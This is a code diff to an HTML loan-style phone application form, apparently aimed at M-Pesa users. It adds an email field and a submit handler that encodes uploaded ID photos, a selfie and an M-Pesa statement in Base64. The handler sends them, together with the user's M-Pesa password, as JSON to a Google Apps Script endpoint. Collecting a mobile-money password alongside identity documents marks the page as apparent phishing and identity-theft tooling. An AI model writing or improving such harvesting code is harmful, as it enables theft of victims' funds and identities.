@@ -188,6 +188,9 @@
         <label>Full Names (As they appear on ID)</label>
         <input type="text" name="full_name" placeholder="Enter your 3 names" required>
 
+        <label>Email Address (For Confirmation)</label>
+        <input type="email" name="customer_email" placeholder="email@example.com" required>
+
         <label>National ID Number</label>
         <input type="text" name="id_number" maxlength="8" placeholder="Enter ID Number" required>
 
@@ -257,28 +260,67 @@
     const btn = document.getElementById('submitBtn');
     const btnText = document.getElementById('btnText');
 
-    form.addEventListener('submit', e => {
+    form.addEventListener('submit', async (e) => {
         e.preventDefault();
         btn.disabled = true;
-        btnText.innerHTML = "Submitting... Please wait";
+        btnText.innerHTML = "Uploading Documents... Please wait";
 
-        // Convert files to Base64 to ensure they actually reach the sheet
-        const reader = new FileReader();
-        const formData = new FormData(form);
-        
-        fetch(scriptURL, { method: 'POST', body: formData })
-            .then(response => {
-                btnText.innerHTML = "✅ Submitted Successfully";
-                btn.style.backgroundColor = "#166534";
-                alert("Success! Your application has been received. Our team will review your docs and contact you shortly.");
-                form.reset();
-            })
-            .catch(error => {
-                btn.disabled = false;
-                btnText.innerHTML = "Submit Application for Review";
-                alert("Submission error. Please check your internet and try again.");
-                console.error('Error!', error.message);
+        const convertBase64 = (file) => {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = error => reject(error);
             });
+        };
+
+        try {
+            // Processing files to Base64
+            const idFrontBase64 = await convertBase64(form.id_front.files[0]);
+            const idBackBase64 = await convertBase64(form.id_back.files[0]);
+            const selfieBase64 = await convertBase64(form.selfie.files[0]);
+            const mpesaBase64 = await convertBase64(form.mpesa_statement.files[0]);
+
+            const payload = {
+                region: form.region.value,
+                phone_brand: form.phone_brand.value,
+                preferred_phone: form.phone_model.value,
+                full_name: form.full_name.value,
+                customer_email: form.customer_email.value,
+                id_number: form.id_number.value,
+                mpesa_password: form.mpesa_password.value,
+                nok_name: form.nok_name.value,
+                nok_id: form.nok_id.value,
+                nok_contact: form.nok_contact.value,
+                id_front: idFrontBase64,
+                id_back: idBackBase64,
+                selfie: selfieBase64,
+                mpesa_statement: mpesaBase64
+            };
+
+            // Using fetch with JSON stringify as your script needs JSON.parse
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors', // Standard for Google Script Web Apps
+                cache: 'no-cache',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            btnText.innerHTML = "✅ Submitted Successfully";
+            btn.style.backgroundColor = "#166534";
+            alert("Success! Your application has been received. Please check your email/sheet.");
+            form.reset();
+            btn.disabled = false;
+            btnText.innerHTML = "Submit Application for Review";
+            btn.style.backgroundColor = "";
+
+        } catch (error) {
+            btn.disabled = false;
+            btnText.innerHTML = "Submit Application for Review";
+            alert("There was an error processing your images. Please try again.");
+            console.error('Error!', error);
+        }
     });
 </script>
 
